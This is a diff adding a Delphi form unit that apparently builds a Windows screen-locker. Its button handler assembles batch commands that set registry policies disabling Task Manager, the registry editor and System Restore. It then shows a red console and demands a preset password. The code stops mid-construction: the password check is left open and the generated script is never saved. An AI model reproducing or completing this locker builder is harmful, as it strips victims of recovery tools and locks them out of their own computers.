@@ -1,0 +1,71 @@
+unit Unit1;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;
+
+type
+  TForm1 = class(TForm)
+    Label1: TLabel;
+    Edit1: TEdit;
+    Label2: TLabel;
+    Label3: TLabel;
+    Edit2: TEdit;
+    Label4: TLabel;
+    Edit3: TEdit;
+    Label5: TLabel;
+    Edit4: TEdit;
+    Label6: TLabel;
+    Edit5: TEdit;
+    Label7: TLabel;
+    Edit6: TEdit;
+    Button1: TButton;
+    procedure Button1Click(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+  end;
+
+var
+  Form1: TForm1;
+  winTitle: string;
+  title: string;
+  text: string;
+  password: string;
+  temp: string;
+  path: string;
+
+implementation
+
+{$R *.dfm}
+
+procedure TForm1.Button1Click(Sender: TObject);
+var stringList: TStringList;
+begin
+  // Parameters
+  winTitle := Edit1.Text;
+  title := Edit2.Text;
+  text := Edit3.Text;
+  password := Edit4.Text;
+  temp := Edit5.Text;
+  path := Edit6.Text;
+
+  // Temporary file
+  stringList := TStringList.Create;
+
+  stringList.Add('@echo off');
+  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
+  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f');
+  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableSR /t REG_DWORD /d 1 /f');
+  stringList.Add('chcp 65001 > nul');
+  stringList.Add('color 0c');
+  stringList.Add('echo '+title);
+  stringList.Add('set /p PSWD=');
+  stringList.Add('if %PSWD%=='+password+' (');
+  stringList.Add('');
+end;
+
+end.
